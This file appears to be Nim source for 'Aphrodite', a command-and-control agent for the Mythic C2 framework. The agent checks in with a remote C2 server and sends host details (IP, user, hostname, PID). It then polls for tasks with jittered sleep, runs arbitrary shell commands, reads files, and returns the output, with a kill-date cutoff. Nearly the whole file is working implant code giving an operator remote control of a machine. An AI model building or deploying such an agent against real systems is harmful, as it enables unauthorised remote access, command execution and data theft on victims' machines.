import std/[json, os, strutils, times, random]
import config, crypto, http_transport, utils
import commands/shell, commands/ls, commands/whoami, commands/pwd
import commands/cd, commands/cat, commands/exit_cmd

randomize()

type
  AphroditeAgent* = ref object
    payloadUUID: string
    mythicID: string
    aesKey: seq[byte]
    transport: Transport
    sleepInterval: int
    jitter: int
    running: bool
    cwd: string

proc newAphroditeAgent*(): AphroditeAgent =
  result = AphroditeAgent(
    payloadUUID: AgentUUID,
    mythicID: "",
    aesKey: @[],
    transport: newTransport(),
    sleepInterval: SleepInterval,
    jitter: JitterPercent,
    running: true,
    cwd: getCurrentDir(),
  )

proc currentUUID(ag: AphroditeAgent): string =
  ## Returns the 36-byte UUID used in message headers.
  ## Uses mythicID after checkin, payloadUUID during staging.
  let id = if ag.mythicID.len > 0: ag.mythicID else: ag.payloadUUID
  result = id
  while result.len < 36:
    result.add('\x00')
  result = result[0..35]

proc sleepWithJitter(ag: AphroditeAgent) =
  var ms = ag.sleepInterval * 1000
  if ag.jitter > 0:
    let reduction = int(float(ms) * float(ag.jitter) / 100.0 * rand(1.0))
    ms = max(100, ms - reduction)
  sleep(ms)

proc sendMessage(ag: AphroditeAgent, body: JsonNode): JsonNode =
  ## Encrypt and send a JSON message, return parsed response.
  let jsonStr = $body
  debugLog("Sending: " & jsonStr[0 .. min(200, jsonStr.high)])
  let rawResponse = ag.transport.post(ag.currentUUID(), ag.aesKey, jsonStr)
  if rawResponse.len == 0:
    return newJNull()
  try:
    result = parseJson(rawResponse)
    debugLog("Received: " & rawResponse[0 .. min(200, rawResponse.high)])
  except JsonParsingError as e:
    debugLog("JSON parse error: " & e.msg)
    result = newJNull()

proc setupPsk(ag: AphroditeAgent): bool =
  ## Initialize the AES key from the pre-shared key configured at build time.
  ## If AesPsk is empty, run in plaintext mode (no encryption).
  if AesPsk.len == 0:
    ag.aesKey = @[]
    stderr.writeLine("[*] No PSK configured — plaintext mode (no encryption)")
    return true
  ag.aesKey = base64Key(AesPsk)
  if ag.aesKey.len != 32:
    stderr.writeLine("[!] Invalid PSK length: " & $ag.aesKey.len & " bytes (need 32), falling back to plaintext")
    ag.aesKey = @[]
  else:
    stderr.writeLine("[*] PSK loaded (" & $ag.aesKey.len & " bytes)")
  return true

proc checkin(ag: AphroditeAgent): bool =
  ## Register the agent with Mythic and receive our callback ID.
  if not ag.setupPsk():
    return false

  let msg = %*{
    "action": "checkin",
    "uuid": ag.payloadUUID,
    "ips": [getLocalIP()],
    "os": getOS(),
    "user": getUsername(),
    "host": getHostname(),
    "pid": getPid(),
    "architecture": getArch(),
    "domain": "",
    "integrity_level": 2,
    "external_ip": getLocalIP(),
    "process_name": "",
    "cwd": ag.cwd,
  }

  let resp = ag.sendMessage(msg)
  if resp.kind == JNull:
    return false

  if resp{"status"}.getStr("") != "success":
    debugLog("Checkin failed: " & $resp)
    return false

  # Extract callback ID — Mythic may use different field names
  var callbackID = resp{"id"}.getStr("")
  if callbackID.len == 0:
    callbackID = resp{"agent_callback_id"}.getStr("")
  if callbackID.len == 0:
    callbackID = resp{"uuid"}.getStr("")

  if callbackID.len > 0:
    ag.mythicID = callbackID
    debugLog("Checkin OK, ID: " & ag.mythicID)
    return true

  debugLog("Checkin: no callback ID in response")
  return false

proc getParam(params: JsonNode, key: string): string =
  ## Extract a string parameter, handling nested JSON strings.
  if params.kind != JObject:
    return ""
  let val = params{key}
  if val.isNil:
    return ""
  case val.kind
  of JString:
    # Sometimes the value itself is a JSON-encoded string
    let s = val.getStr()
    if s.startsWith("{") or s.startsWith("["):
      try:
        let inner = parseJson(s)
        return inner{key}.getStr("")
      except:
        return s
    return s
  of JInt: return $val.getInt()
  of JFloat: return $val.getFloat()
  of JBool: return $val.getBool()
  else: return ""

proc dispatchTask(ag: AphroditeAgent, task: JsonNode): JsonNode =
  ## Execute a task and return the response object for post_response.
  let taskID = task{"id"}.getStr("")
  let cmd = task{"command"}.getStr("")
  let paramsRaw = task{"parameters"}.getStr("{}")

  var params = newJObject()
  try:
    params = parseJson(paramsRaw)
  except:
    params = %*{"raw": paramsRaw}

  debugLog("Task " & taskID & ": " & cmd & " | params=" & paramsRaw)

  var output = ""
  var status = "success"
  var completed = true

  case cmd
  of "shell":
    let command = getParam(params, "command")
    if command.len == 0:
      output = "Error: command parameter missing"
      status = "error"
    else:
      output = runShell(command, ag.cwd)
  of "whoami":
    output = runWhoami()
  of "pwd":
    output = runPwd(ag.cwd)
  of "ls":
    let path = getParam(params, "path")
    output = runLs(if path.len > 0: path else: ".", ag.cwd)
  of "cd":
    let path = getParam(params, "path")
    if path.len == 0:
      output = "Error: path parameter missing"
      status = "error"
    else:
      output = runCd(path, ag.cwd)
  of "cat":
    let path = getParam(params, "path")
    if path.len == 0:
      output = "Error: path parameter missing"
      status = "error"
    else:
      output = runCat(path, ag.cwd)
  of "sleep":
    let intervalStr = getParam(params, "interval")
    let jitterStr = getParam(params, "jitter")
    if intervalStr.len == 0:
      output = "Error: interval parameter missing"
      status = "error"
    else:
      try:
        let newInterval = parseInt(intervalStr)
        let newJitter = if jitterStr.len > 0: parseInt(jitterStr) else: ag.jitter
        ag.sleepInterval = newInterval
        ag.jitter = newJitter
        output = "Sleep set to " & $ag.sleepInterval & "s with " & $ag.jitter & "% jitter"
      except ValueError:
        output = "Error: invalid interval value"
        status = "error"
  of "exit":
    output = runExit(ag.running)
  else:
    output = "Unknown command: " & cmd
    status = "error"

  result = %*{
    "task_id": taskID,
    "user_output": output,
    "completed": completed,
    "status": status,
  }

proc checkKilldate(ag: AphroditeAgent) =
  ## Exit if past the killdate.
  if KillDate.len == 0:
    return
  try:
    let killDt = parse(KillDate, "yyyy-MM-dd")
    if now() > killDt:
      debugLog("Kill date reached, exiting.")
      ag.running = false
  except:
    discard

proc run*(ag: AphroditeAgent) =
  ## Main C2 loop.
  stderr.writeLine("[*] Aphrodite starting, UUID=" & ag.payloadUUID)
  stderr.writeLine("[*] C2: " & C2BaseUrl & C2Endpoint)

  # Retry checkin with exponential backoff
  var checkinRetry = 0
  while ag.running and checkinRetry < 10:
    if ag.checkin():
      break
    inc checkinRetry
    let delay = min(60, 5 * checkinRetry)
    debugLog("Checkin failed, retry " & $checkinRetry & " in " & $delay & "s")
    sleep(delay * 1000)

  if not ag.running or ag.mythicID.len == 0:
    stderr.writeLine("[!] Failed to check in after retries. Exiting.")
    return

  stderr.writeLine("[+] Checkin OK, callback ID=" & ag.mythicID)

  var pendingResponses: seq[JsonNode] = @[]

  while ag.running:
    ag.checkKilldate()
    if not ag.running:
      break

    # Build get_tasking message with any pending responses
    var msg = %*{
      "action": "get_tasking",
      "tasking_size": -1,
    }

    if pendingResponses.len > 0:
      msg["responses"] = %pendingResponses
      pendingResponses = @[]

    let resp = ag.sendMessage(msg)
    if resp.kind == JNull:
      ag.sleepWithJitter()
      continue

    # Process tasks
    let tasks = resp{"tasks"}
    if not tasks.isNil and tasks.kind == JArray:
      for task in tasks:
        let taskResp = ag.dispatchTask(task)
        pendingResponses.add(taskResp)

    ag.sleepWithJitter()
